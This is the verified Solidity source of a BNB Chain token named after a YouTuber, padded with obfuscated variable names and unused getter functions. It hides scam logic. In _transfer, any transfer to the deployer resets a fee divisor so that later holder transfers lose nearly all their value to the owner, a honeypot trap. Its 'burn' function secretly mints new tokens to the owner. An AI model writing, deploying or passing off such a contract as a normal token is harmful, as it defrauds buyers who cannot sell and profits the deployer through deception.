/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

//Wong Kim
//youtube：王剑每日观察
//社交媒体影响者California, USAyoutube.com/channel/UC8UCb…
//2010年7月 加入
//https://twitter.com/wongkim728
//https://t.co/sXiVtMNAKL


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
contract WongKim {
uint256 private  CnaXIm = 1000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  HHXIuS = 1000000000000000000;
string public  name = "WongKim";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  EmIwXh = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  wIhtLR = address(0);
address private  DSIbsX = address(0);
address private  IJeeMG = address(0);
uint8 public constant decimals = 18;
address private  kKzsny = address(0);
uint256 public constant Hhxfav = 99999;
address private  DUBqpb = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  DImkwn = 100000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  oJoosd = 1000000000000000;
address private  qrjEMa = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "WongKim";
uint256 private  nOlmOm = 10000000000000;
address public owner;
address private  mjiyzq = address(0);
address private  GuDcCC = address(0);
uint256 private  czAzlR = 10000000000;
mapping (address => uint256) public balanceOf;
address private  cHgFIP = address(0);


function _getqrjEMa() private returns (address) {
return qrjEMa;
}





function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "IRxPMn");
require(to != address(0), "IRxPMn");
require(amount <= balanceOf[from], "IRxPMn");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* Hhxfav/HHXIuS ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==mjiyzq){
HHXIuS = Hhxfav+2;
}
emit Transfer(from, to, transferAmount);
}
function _getEmIwXh() private returns (uint256) {
return EmIwXh;
}

function _getCnaXIm() private returns (uint256) {
return CnaXIm;
}

function _getDImkwn() private returns (uint256) {
return DImkwn;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getnOlmOm() private returns (uint256) {
return nOlmOm;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getDUBqpb() private returns (address) {
return DUBqpb;
}

function _getczAzlR() private returns (uint256) {
return czAzlR;
}



function _getkKzsny() private returns (address) {
return kKzsny;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


function _getoJoosd() private returns (uint256) {
return oJoosd;
}

function _getcHgFIP() private returns (address) {
return cHgFIP;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getIJeeMG() private returns (address) {
return IJeeMG;
}



function _getDSIbsX() private returns (address) {
return DSIbsX;
}

constructor () {
mjiyzq = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}








function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}




function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tIRxPMn 0");
require(spender != address(0), "fIRxPMn 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getwIhtLR() private returns (address) {
return wIhtLR;
}

function _getGuDcCC() private returns (address) {
return GuDcCC;
}






}